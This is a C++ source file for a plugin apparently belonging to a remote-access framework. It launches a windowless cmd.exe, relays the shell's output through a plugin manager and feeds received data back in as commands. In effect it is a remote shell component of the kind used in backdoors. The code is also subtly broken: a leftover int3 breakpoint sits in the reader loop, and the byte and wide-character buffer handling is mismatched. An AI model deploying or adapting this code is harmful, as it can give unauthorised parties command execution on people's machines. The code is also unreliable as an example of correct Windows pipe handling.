#include "remoteshell.h"
#include <stdio.h>

int RemoteShell::threadReader(register RemoteShell *_this){
    char buff[800];
    wchar_t wBuff[800];

    if(_this){
        _this->shell = createShell();
        _this->threadRuning = true;
        //Espera hasta que se termine de cargar
        while(!_this->mgr)Sleep(100);

        while(_this->threadRuning){
            //long bytesRead = readShell(_this->shell,&readData);
            long bytesRead = readShell(_this->shell,buff,sizeof(buff)-2);
            if(bytesRead>0){
                *((wchar_t*)(buff+bytesRead)) = 0;
                bytesRead += sizeof(wchar_t);
                __asm__("int3");
                MultiByteToWideChar(CP_ACP, 0,buff,bytesRead,wBuff, bytesRead);

                _this->mgr->sendData((char*)wBuff,bytesRead*sizeof(*wBuff));
                //free(readData);
            }else Sleep(20);
        }
    }
    return 0;
}

RemoteShell::RemoteShell(){
    mgr = null;
    shell = null;
    recivedData = null;
    ulong threadId;
    hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,&threadId);
    printf("newThread %x id\n",threadId);
}

RemoteShell::~RemoteShell(){
    TerminateThread(hThreadReader,0);
    deleteShell(shell);
}

const char *RemoteShell::getPluginName(){
    return "RemoteShell";
}

int RemoteShell::onReciveData(char *data, uint size){
    bool writed = false;
    printf("onReciveData %x bytes\n",size);

    return writeShell(shell,data,size);
}

void RemoteShell::setPluginManager(pluginManagerInterface *mgr){
    this->mgr = mgr;
}

PluginInterface* getInterface(){
    return new RemoteShell();
}

Shell* createShell(){
    SECURITY_ATTRIBUTES attrib;
    Shell* shell = (Shell*)malloc(sizeof(Shell));

    ZeroMemory(shell,sizeof(*shell));
    ZeroMemory(&attrib,sizeof(attrib));

    attrib.bInheritHandle = true;
    attrib.nLength = sizeof(attrib);

    CreatePipe(&shell->hRead,&shell->startInfo.hStdOutput,&attrib,0);
    CreatePipe(&shell->startInfo.hStdInput,&shell->hWrite,&attrib,0);
    shell->startInfo.hStdError = shell->startInfo.hStdOutput;

    SetHandleInformation(shell->hRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(shell->hWrite, HANDLE_FLAG_INHERIT, 0);

    shell->startInfo.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;

    CHAR cmdPath[MAX_PATH];
    GetSystemDirectoryA(cmdPath,MAX_PATH);
    lstrcatA(cmdPath,"\\cmd.exe /d /Q");

    CreateProcess(0,cmdPath,0,0,TRUE,0,0,0,&shell->startInfo,&shell->ProcessInformation);
    Sleep(500);

    return shell;
}

bool deleteShell(Shell* shell){
    TerminateProcess(shell->ProcessInformation.hProcess,0);
    CloseHandle(shell->hRead);
    CloseHandle(shell->hWrite);
    CloseHandle(shell->startInfo.hStdInput);
    CloseHandle(shell->startInfo.hStdOutput);
    return true;
}

int writeShell(Shell* shell,char* str,uint size){
    printf("%S\n",(wchar_t*)str);

    WriteFile(shell->hWrite,str,size,(ulong*)&size,0);

    return size;
}

int readShell(Shell* shell,char* buff,ulong size){
    wchar_t byte;
    long BytesRead = 0,totalRead = 0;

    while(PeekNamedPipe(shell->hRead,
                        &byte,sizeof(byte),(ulong*)&BytesRead,0,0) && BytesRead>0){
        ReadFile(shell->hRead,buff+totalRead,size-totalRead,(ulong*)&BytesRead,0);
        totalRead += BytesRead;
        if(totalRead == size)break;
        Sleep(50);
    }
    if(totalRead)BytesRead = totalRead;

    return BytesRead;
}
